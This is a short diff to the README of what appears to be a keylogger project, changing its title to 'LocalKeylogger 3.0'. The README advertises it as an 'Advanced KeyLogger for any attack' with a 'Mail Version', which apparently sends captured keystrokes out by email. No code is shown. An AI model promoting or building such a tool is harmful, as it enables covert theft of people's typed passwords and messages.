@@ -1,4 +1,4 @@
-# LocalKeylogger
+# LocalKeylogger 3.0
 
 #### Advanced KeyLogger for any attack 
 #### With Mail Version!
